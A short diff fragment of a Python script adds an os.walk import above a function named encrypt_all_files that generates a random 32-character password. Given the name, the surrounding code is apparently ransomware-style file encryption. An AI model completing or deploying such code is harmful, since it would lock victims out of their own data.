@@ -6,6 +6,7 @@ from Crypto import Random
 import threading
 import os
 import sys
+from os import walk
 
 def encrypt_all_files():
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) 
